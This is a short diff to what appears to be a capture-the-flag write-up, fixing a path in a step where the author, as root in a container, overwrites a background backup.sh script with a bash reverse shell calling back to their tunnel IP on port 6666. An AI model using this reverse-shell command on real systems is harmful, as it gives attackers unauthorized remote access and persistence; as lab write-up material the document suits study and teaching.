@@ -203,7 +203,7 @@ root@bf18790496b8:/# hostname
 bf18790496b8
 ```
 
-Checking around the system i found under `/opt` as `backup.sh` file, seems like is running in the background. Let's add a reverse shell in.
+Checking around the system i found under `/opt/backups` a `backup.sh` file, seems like is running in the background. Let's add a reverse shell in.
 
 ```
 root@bf18790496b8:/opt/backups# echo "bash -c 'bash -i >& /dev/tcp/<tun0 ip>/6666 0>&1'" > backup.sh
